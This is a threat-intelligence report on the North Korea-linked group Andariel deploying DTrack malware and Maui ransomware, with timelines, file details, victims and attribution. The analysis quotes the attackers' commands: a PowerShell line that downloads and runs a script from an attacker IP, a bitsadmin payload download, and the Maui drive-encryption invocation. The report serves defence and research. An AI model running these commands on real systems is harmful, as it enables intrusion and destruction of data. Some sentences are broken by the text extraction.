securelist.com /andariel-deploys-dtrack-and-maui-ransomware/107063/ Andariel deploys DTrack and Maui ransomwareAuthorsKurt BaumgartnerSeongsu ParkOn July 7, 2022, the CISA published an alert, entitled, “North Korean State-Sponsored Cyber Actors Use Maui Ransomware To Target the Healthcare and Public Health Sector,” related to a Stairwell report, “Maui Ransomware.” Later, the Department of Justice announced that they had effectively clawed back $500,000 in ransom payments to the group, partly thanks to new legislation. We can confirm a Maui ransomware incident in 2022, and add some incident and attribution findings.We extend their “first seen” date from the reported May 2021 to April 15th 2021, and the geolocation of the target, to Japan. Because the malware in this early incident was compiled on April 15th, 2021, and compilation dates are the same for all known samples, this incident is possibly the first ever involving the Maui ransomware.While CISA provides no useful information in its report to attribute the ransomware to a North Korean actor, we determined that approximately ten hours prior to deploying Maui to the initial target system, the group deployed a variant of the well-known DTrack malware to the target, preceded by 3proxy months earlier. This data point, along with others, should openly help solidify the attribution to the Korean- speaking APT Andariel, also known as Silent Chollima and Stonefly, with low to medium confidence. Background1/6We observed the following timeline of detections from an initial target system:1. 2020-12-25 Suspicious 3proxy tool 2. 2021-04-15 DTrack malware 3. 2021-04-15 Maui ransomwareDTrack malwareMD5 2021-03-30 02:29:15 PE32 executable (GUI) Intel 80386, for MS Windows VS2008 build 21022 1.2 MB C:\Windows\Temp\temp\mvhost.exeOnce this malware is spawned, it executes an embedded shellcode, loading a final Windows in-memory payload. This malware is responsible for collecting victim information and sending it to the remote host. Its functionality is almost identical to previous DTrack modules. This malware collects information about the infected host via Windows commands. The in-memory payload executes the following Windows variant did. Compared to the old version of DTrack, the new information-gathering module sends stolen information to a remote server over HTTP, and this variant copies stolen files to the remote host on the same network. Maui ransomwareThe Maui ransomware was detected ten hours after the DTrack variant on the same server.MD5 2021-04-15 04:36:00 PE32 executable (GUI) Intel 80386, for MS Windows2/6File size File name763.67 KB C:\Windows\Temp\temp\maui.exeMultiple run parameters exist for the Maui ransomware. In this incident, we observe the actors using “-t” and “- x” arguments, along with a specific drive path to encrypt:1 C:\Windows\Temp\temp\bin\Maui.exe -t 8 -x E:In this case, “-t 8” sets the ransomware thread count to eight, “-x” commands the malware to “self melt”, and the “E:” value sets the path (the entire drive in this case) to be encrypted. The ransomware functionality is the same as described in the Stairwell report.The malware created two key files to implement file encryption:RSA private key RSA public key Similar DTrack malware on different victimsC:\Windows\Temp\temp\bin\Maui.evd C:\Windows\Temp\temp\bin\Maui.keyPivoting on the exfiltration information to the adjacent hosts, we discovered additional victims in India. One of these hosts was initially compromised in February 2021. In all likelihood, Andariel stole elevated credentials to deploy this malware within the target organization, but this speculation is based on paths and other artifacts, and we do not have any further details.MD5 2021-02-22 05:36:16 PE32 executable (GUI) Intel 80386, for MS Windows 848 KBThe primary objective of this malware is the same as in the case of the aforementioned victim in Japan, using different login credentials and local IP address to exfiltrate data.Windows commands to exfiltrate dataFrom the same victim, we discovered additional DTrack malware (MD5 Additional DTrack module and initial infection methodThe “3Proxy” tool, likely utilized by the threat actor, was compiled on 2020-09-09 and deployed to the victim on 2020-12-25. Based on this detection and compilation date, we expanded our research scope3/6and discovered an additional DTrack module. This module was compiled 2020-09-16 14:16:21 and detected in early December 2020, having a similar timeline to the 3Proxy tool deployment.MD5 2020-09-16 14:16:21 PE32 executable (GUI) Intel 80386, for MS Windows VS2008 build 21022 136 KB %appdata%\microsoft\mmc\dwem.certThis DTrack module is very similar to the EventTracKer module of DTrack, which was previously reported to our Threat Intelligence customers. In one victim system, we discovered that a well-known simple HTTP server, HFS7, had deployed the malware above. After an unknown exploit was used on a vulnerable HFS server and “whoami” was executed, the Powershell command below was executed to fetch an additional Powershell script from the remote server:1 C:\windows\system32\WindowsPowershell\v1.0\powershell.exe IEX (New-Object Net.WebClient).DownloadString('hxxp://145.232.235[.]222/usr/users/mini.ps1')The mini.ps1 script is responsible for downloading and executing the above DTrack malware via bitsadmin.exe:1bitsadmin.exe /transfer myJob /download /priority high2"hxxp://145.232.235[.]222/usr/users/dwem.cert" "%appdata%\microsoft\mmc\dwem.cert"The other victim operated a vulnerable Weblogic server. According to our telemetry, the actor compromised this server via the CVE-2017-10271 exploit. We saw Andariel abuse identical exploits and compromise WebLogic servers in mid-2019, and previously reported this activity to our Threat Intelligence customers. In this case, the exploited server executes the Powershell command to fetch the additional script. The fetched script is capable of downloading a Powershell script from the server we mentioned above (hxxp://145.232.235[.]222/usr/users/mini.ps1). Therefore, we can summarize that the actor abused vulnerable Internet-facing services to deploy their malware at least until the end of 2020. VictimsThe July 2022 CISA alert noted that the healthcare and public health sectors had been targeted with the Maui ransomware within the US. However, based on our research, we believe this operation does not target specific industries and that its reach is global. We can confirm that the Japanese housing company was targeted with the Maui ransomware on April 15, 2021. Also, victims from India, Vietnam, and Russia were infected within a similar timeframe by the same DTrack malware as used in the Japanese Maui incident: from the end of 2020 to early 2021.Our research suggests that the actor is rather opportunistic and could compromise any company around the world, regardless of their line of business, as long as it enjoys good financial standing. It is probable4/6that the actor favors vulnerable Internet-exposed web services. Additionally, the Andariel deployed ransomware selectively to make financial profits.AttributionAccording to the Kaspersky Threat Attribution Engine (KTAE), the DTrack malware from the victim published/reported by Symantec – note that Symantec recently described the Backdoor.Preft malware as “aka Dtrack, Valefor”. Apart from the code similarity, the actor used 3Proxy tool (MD5 attributes StoneFly as the North Korean-linked actor behind the DarkSeoul incident. ConclusionsBased on the modus operandi of this attack, we conclude that the actor’s TTPs behind the Maui ransomware incident is remarkably similar to past Andariel/Stonefly/Silent Chollima activity:Using legitimate proxy and tunneling tools after initial infection or deploying them to maintain access, and using Powershell scripts and Bitsadmin to download additional malware; Using exploits to target known but unpatched vulnerable public services, such as WebLogic and HFS; Exclusively deploying DTrack, also known as Preft; Dwell time within target networks can last for months prior to activity; Deploying ransomware on a global scale, demonstrating ongoing financial motivations and scale of interest5/66/6 